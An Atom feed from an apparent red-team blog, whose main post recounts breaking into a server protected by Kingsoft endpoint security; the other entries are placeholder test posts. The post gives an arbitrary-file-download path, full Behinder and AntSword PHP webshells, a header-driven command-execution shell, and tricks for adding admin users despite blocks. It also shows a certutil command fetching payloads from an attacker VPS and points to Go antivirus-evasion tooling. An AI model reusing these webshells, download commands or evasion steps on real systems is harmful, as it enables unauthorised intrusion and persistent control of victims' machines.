<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://redteamblog.icu</id>
    <title>毅种循环的洗剑录</title>
    <updated>2022-04-23T07:08:24.484Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://redteamblog.icu"/>
    <link rel="self" href="https://redteamblog.icu/atom.xml"/>
    <subtitle>&lt;br&gt;西郊有密林，助君出重围。&lt;br&gt;
&lt;br&gt;Information Safety/Redteam/Moyu&lt;br&gt;</subtitle>
    <logo>https://redteamblog.icu/images/avatar.png</logo>
    <icon>https://redteamblog.icu/favicon.ico</icon>
    <rights>All rights reserved 2022, 毅种循环的洗剑录</rights>
    <entry>
        <title type="html"><![CDATA[浅谈bypass金山终端安全系统的心路历程]]></title>
        <id>https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/</id>
        <link href="https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/">
        </link>
        <updated>2022-04-23T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="关于金山终端的bypass心路历程-1">关于金山终端的bypass心路历程 (1)</h1>
<h3 id="浅谈bypass金山终端安全系统的心路历程"><strong>浅谈bypass金山终端安全系统的心路历程</strong></h3>
<h3 id="1漏洞详情"><strong>1.漏洞详情</strong></h3>
<p>任意文件下载</p>
<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/1650697624370.png" alt="" loading="lazy"></figure>
<pre><code>/htmltopdf/downfile.php?filename=xxx

/conf
/.ssh
.....
</code></pre>
<p>任意文件上传</p>
<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/1650697685858.png" alt="" loading="lazy"></figure>
<h3 id="2getshell"><strong>2.getshell</strong></h3>
<p>遇到几个问题</p>
<p>1.上传任意文件被秒删，只能存活一秒。</p>
<p>2.php的 <code>eval、create_function、base64_decode</code> 等敏感函数被杀，以及函数不能传递任何参数，但system等命令执行函数能执行。</p>
<p>3.无法执行敏感命令操作，比如 <code>net user /add</code> ，ps反弹cs等。</p>
<p>对于第一个问题，虽然只能存活一秒，但是能执行成功，我们可以往其他目录写shell。比如</p>
<pre><code class="language-php">&lt;?php file_put_contents(&quot;../../xx.php&quot;,'xxxx');
</code></pre>
<p>这样可以解决第一个问题，我们可以写shell到其他目录来bypass。</p>
<p>第二个问题，<code>eval</code> 函数被禁用，不能传递参数，需要传递参数的shell均无法执行。比如冰蝎</p>
<pre><code class="language-php">&lt;?php
@error_reporting(0);
session_start();
    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION['k']=$key;
    session_write_close();
    $post=file_get_contents(&quot;php://input&quot;);
    if(!extension_loaded('openssl'))
    {
        $t=&quot;base64_&quot;.&quot;decode&quot;;
        $post=$t($post.&quot;&quot;);

        for($i=0;$i&lt;strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&amp;15];
                }
    }
    else
    {
        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p.&quot;&quot;);}}
    @call_user_func(new C(),$params);
?&gt;
</code></pre>
<p>简单观察一下冰蝎的马，首先是有post传参，然后是 <code>eval</code> 函数，所以pass了。然后我们先观察蚁剑的插件生成的免杀马</p>
<pre><code class="language-php">&lt;?php
class JADE {
    function aoMy() {
        $mmaQ = &quot;\x29&quot; ^ &quot;\x48&quot;;
        $kndi = &quot;\xda&quot; ^ &quot;\xa9&quot;;
        $yRpX = &quot;\xb7&quot; ^ &quot;\xc4&quot;;
        $tHGH = &quot;\x1f&quot; ^ &quot;\x7a&quot;;
        $EBzf = &quot;\x35&quot; ^ &quot;\x47&quot;;
        $WFrO = &quot;\x4b&quot; ^ &quot;\x3f&quot;;
        $iGgJ =$mmaQ.$kndi.$yRpX.$tHGH.$EBzf.$WFrO;
        return $iGgJ;
    }
    function __destruct(){
        $KUht=$this-&gt;aoMy();
        @$KUht($this-&gt;rx);
    }
}
$jade = new JADE();
@$jade-&gt;rx = isset($_GET['id'])?base64_decode($_POST['qwq']):$_POST['qwq'];
?&gt;
</code></pre>
<p>特征很明显。再来看看蚁剑自带的。</p>
<pre><code class="language-php">&lt;?php
    $YCgX=create_function(chr(7560/210).chr(645-530).chr(01674-01515).base64_decode('bQ==').str_rot13('r'),chr(0265370/01630).chr(0324020/01630).str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(0252733/01371).chr(01275-01116).str_rot13('z').chr(204-103).base64_decode('KQ==').chr(21948/372));
$YCgX(base64_decode('OTE3M'.'DMwO0'.'BldkF'.'sKCRf'.''.str_rot13('H').base64_decode('RQ==').chr(225-168).chr(01154-01030).chr(0160150/01234).''.''.chr(25410/363).chr(384-268).str_rot13('0').base64_decode('Wg==').base64_decode('WA==').''.'N0XSk'.'7Mjc1'.'MTA5M'.'Ds='.''));?&gt;
</code></pre>
<p>通过<code>str_rot13</code>和<code>base64</code>相关的字符串处理函数来进行bypass，但是明显有create_function函数在，也被过滤了，后面猜想企业终端云防护应该收录了这种公开的shell，常规bypass应该绕不过。</p>
<p>经过n多种尝试，发现并不能达成直接连上冰蝎或者蚁剑的要求，转换思路尝试写个没有参数传递的能执行命令的伪shell</p>
<p><strong>php无参数rce</strong>，ctf多年前的考点，比如。</p>
<pre><code class="language-php">&lt;?=system(end(getallheaders()));
</code></pre>
<p>当时时间紧迫，只是临时构造了个demo，关于无参数rce还有很多形式的方法。</p>
<h3 id="3获取权限"><strong>3.获取权限</strong></h3>
<p>第二个问题解决了。来到了第三个问题，如何进一步获取主机权限？首先尝试了各种方法。比如</p>
<p>1.远程ps上线（毫无意外的被拦截，应该是云防护拦截的</p>
<p>2.通过<code>net user /add</code>操作添加用户然后3389连，当然这儿已经在内网了，所以可以直接连接。(被拦)</p>
<p>也尝试利用<code>C:\Windows\System32\net1.exe</code>来进行添加，或者通过<code>COPY</code>命令复制<code>net1.exe</code>来绕过防护，比如</p>
<pre><code class="language-powershell">COPY C:\Windows\System32\net1.exe C:\Users\Public\test
start test user xxx /add
</code></pre>
<p>很遗憾被拦截了。</p>
<p>最后经过ping探测，发现出网，决定利用<code>certutil</code>来实现远程下载。比如</p>
<pre><code class="language-bash">certutil -urlcache -split -f http://vps/xxx xxx
</code></pre>
<p>简单服务器起个<code>http</code>服务之后发现可以下载。不过当下载<code>exe</code>的时候发现被拦截了。直接改成其他后缀绕过。</p>
<p>后面思路就很明显了，远程下载exe然后直接上线。然后又被拦截了，想着难道还要我做免杀？</p>
<p>当时已经深夜了，做免杀未免太耗时间，想着添加个管理员用户直接3389连。但是前面的net命令又被禁用了。又来到了熟悉的bypass环节。</p>
<p><strong>使用windows api添加用户</strong></p>
<p>这个方法在去年hw被大家广泛使用。贴个github项目</p>
<pre><code class="language-powershell">https://github.com/lengjibo/NetUser
</code></pre>
<p>原理在这不做过多阐述，大概就是利用windows自带的接口进行相关操作。最后结果图</p>
<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/1650697694881.png" alt="" loading="lazy"></figure>
<h3 id="4常见的shellcode免杀"><strong>4.常见的shellcode免杀</strong></h3>
<p>对于一个web手来说，让我们手写shellcode来bypass杀软有点过分，所以或多或少需要借助已有轮子，这里推荐大家用go来生成相关的木马。</p>
<p>对于go生成的木马特征不是很明显，不过还是容易被识别出来，所以我们需要借助混淆、清除特征来进行隐藏。</p>
<p>对于已有的轮子推荐</p>
<p>go-strip：用来清除go编译的特征以及函数名混淆（当然，go编译的参数也可以进行初步特征清除</p>
<p>garble：很多人使用（在go编译的时候就会进行字节码、函数相关的混淆，过火绒应该还是没问题</p>
<p><strong>web手的进一步免杀工程</strong></p>
<p>通过研究已有项目进行免杀</p>
<pre><code>https://github.com/safe6Sec/GolangBypassAV
</code></pre>
<p>常见的是静态免杀，比如隐藏图片，分离，核心都一样，隐藏特征</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[test312131]]></title>
        <id>https://redteamblog.icu/post/test312131/</id>
        <link href="https://redteamblog.icu/post/test312131/">
        </link>
        <updated>2022-04-23T03:52:31.000Z</updated>
        <content type="html"><![CDATA[<p>231312313</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[多级目录测试]]></title>
        <id>https://redteamblog.icu/post/duo-ji-mu-lu-ce-shi/</id>
        <link href="https://redteamblog.icu/post/duo-ji-mu-lu-ce-shi/">
        </link>
        <updated>2022-04-22T20:17:54.000Z</updated>
        <content type="html"><![CDATA[<p>weqweqq</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[test]]></title>
        <id>https://redteamblog.icu/post/suibi2/</id>
        <link href="https://redteamblog.icu/post/suibi2/">
        </link>
        <updated>2022-04-22T20:15:54.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>1231</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[这是另外一篇随笔的测试]]></title>
        <id>https://redteamblog.icu/post/suibi/</id>
        <link href="https://redteamblog.icu/post/suibi/">
        </link>
        <updated>2022-04-22T20:13:37.000Z</updated>
        <content type="html"><![CDATA[<p>这是另外一篇随笔的测试</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[这是一篇测试内容]]></title>
        <id>https://redteamblog.icu/post/test/</id>
        <link href="https://redteamblog.icu/post/test/">
        </link>
        <updated>2022-04-22T19:06:44.000Z</updated>
        <content type="html"><![CDATA[<p>test</p>
]]></content>
    </entry>
</feed>